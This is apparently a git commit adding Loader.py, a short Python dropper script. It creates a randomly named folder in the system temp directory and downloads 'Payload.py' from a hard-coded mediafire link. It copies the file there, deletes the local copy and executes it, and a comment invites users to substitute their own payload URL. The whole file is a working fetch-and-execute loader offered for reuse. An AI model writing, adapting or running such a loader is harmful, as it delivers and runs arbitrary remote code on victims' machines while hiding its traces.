c4b6f4df752646c18acc9270692cf68f0890e203
NightTab <88324388+NightTabGit@users.noreply.github.com>
2022-02-05 15:45:37 +0000

    Add files via upload

---
+++ Loader.py
@@ -0,0 +1,35 @@
+# Imports.
+import os
+import requests
+import shutil
+import time
+import random
+import tempfile
+
+ABC = ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"] # For random file name.
+
+def generateFiles(): # Generate / Download the file.
+    temp = ""
+    for i in range(0,20):
+        temp = temp + str(ABC[random.randint(0,len(ABC)-1)]) # Creates a folder named with random characters in /Temp.
+
+    full_path = os.path.join(tempfile.gettempdir(), str(temp)) # Creates full path from current dir.
+
+    os.mkdir(full_path) # Create path.
+    
+    file_url = "https://download1642.mediafire.com/smyflua4b7fg/3mhk1r7rwx7zgmv/Payload.py" # Replace with your own file.
+    filename = file_url.split("/")[-1]
+    r = requests.get(file_url, stream = True)
+    if r.status_code == 200:
+        r.raw.decode_content = True
+        with open(filename,'wb') as f:
+            shutil.copyfileobj(r.raw, f) # Creates file locally.
+    else:
+        pass
+    
+    shutil.copy("Payload.py", full_path) # Copys file: Local -> Temp Folder.
+    os.remove("Payload.py") # Removes file (Locally).
+    os.chdir(full_path) # Goes to Temp Folder DIR.
+    os.system('Payload.py') # Runs new Payload.
+
+generateFiles() # Execute.
